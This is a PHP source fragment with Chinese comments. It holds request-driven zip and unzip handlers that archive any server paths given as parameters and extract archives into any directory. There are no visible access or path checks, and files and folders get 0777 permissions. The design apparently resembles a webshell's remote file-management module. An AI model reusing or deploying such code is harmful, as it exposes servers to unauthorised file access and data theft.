        }
    }else{
        return false;
    }
}
/**
 * 将字符串转换为字节数组。
 * @param string $string 输入字符串。
 * @return array 字节数组。
 */
function getBytes($string) {
    $bytes = array();
    for($i = 0; $i < strlen($string); $i++){
        array_push($bytes,ord($string[$i]));
    }
    return $bytes;
}

/**
 * 压缩文件或目录
 * @return string "ok" 或错误信息
 */
function zip(){
    $compressPaths = get("compressPaths");
    $compressFile = get("compressFile");
    
    if (!extension_loaded('zip')) {
        return "zip extension not loaded";
    }
    
    if ($compressPaths == null || $compressFile == null) {
        return "compressPaths or compressFile is null";
    }
    
    // 处理多种格式的输入
    if (is_string($compressPaths)) {
        // 检查是否是 JSON 数组
        $decoded = @json_decode($compressPaths, true);
        if ($decoded !== null && is_array($decoded)) {
            $compressPaths = $decoded;
        } 
        // 检查是否包含 "|" 分隔符（客户端使用 "|" 分隔多个路径）
        else if (strpos($compressPaths, '|') !== false) {
            $compressPaths = explode('|', $compressPaths);
        } 
        // 单个路径
        else {
            $compressPaths = array($compressPaths);
        }
    } else if (is_array($compressPaths)) {
        // 如果已经是数组，直接使用
        // $compressPaths = $compressPaths;
    } else {
        return "compressPaths format error";
    }
    
    // 创建 ZIP 文件
    $zip = new ZipArchive();
    $res = $zip->open($compressFile, ZipArchive::CREATE | ZipArchive::OVERWRITE);
    
    if ($res !== TRUE) {
        return "cannot create zip file: error code " . $res;
    }
    
    // 添加文件或目录到压缩包
    foreach ($compressPaths as $path) {
        // 去除路径两端的空格
        $path = trim($path);
        
        if (!file_exists($path)) {
            $zip->close();
            @unlink($compressFile);
            return "path not found: " . $path;
        }
        
        if (is_file($path)) {
            // 添加单个文件
            $zip->addFile($path, basename($path));
        } else if (is_dir($path)) {
            // 添加目录
            addDirToZip($zip, $path, basename($path));
        }
    }
    
    $zip->close();
    @chmod($compressFile, 0777);
    return "ok";
}

/**
 * 递归添加目录到 ZIP
 * @param ZipArchive $zip ZIP 对象
 * @param string $realPath 实际路径
 * @param string $zipPath ZIP 内路径
 */
function addDirToZip($zip, $realPath, $zipPath) {
    $zip->addEmptyDir($zipPath);
    
    $files = @scandir($realPath);
    if ($files !== false) {
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                $realFilePath = $realPath . '/' . $file;
                $zipFilePath = $zipPath . '/' . $file;
                
                if (is_file($realFilePath)) {
                    $zip->addFile($realFilePath, $zipFilePath);
                } else if (is_dir($realFilePath)) {
                    addDirToZip($zip, $realFilePath, $zipFilePath);
                }
            }
        }
    }
}

/**
 * 解压 ZIP 文件
 * @return string "ok" 或错误信息
 */
function unzip(){
    $compressFile = get("compressFile");
    $extractDir = get("extractDir");
    
    if (!extension_loaded('zip')) {
        return "zip extension not loaded";
    }
    
    if ($compressFile == null || $extractDir == null) {
        return "compressFile or extractDir is null";
    }
    
    if (!file_exists($compressFile)) {
        return "compress file not found";
    }
    
    // 创建目标目录
    if (!is_dir($extractDir)) {
        if (!@mkdir($extractDir, 0777, true)) {
            return "cannot create extract directory";
        }
    }
    
    // 打开 ZIP 文件
    $zip = new ZipArchive();
    $res = $zip->open($compressFile);
    
    if ($res !== TRUE) {
        return "cannot open zip file: error code " . $res;
    }
    
    // 解压到目标目录
    if (!$zip->extractTo($extractDir)) {
        $zip->close();
        return "extract failed";
    }
    
    $zip->close();
    return "ok";
}
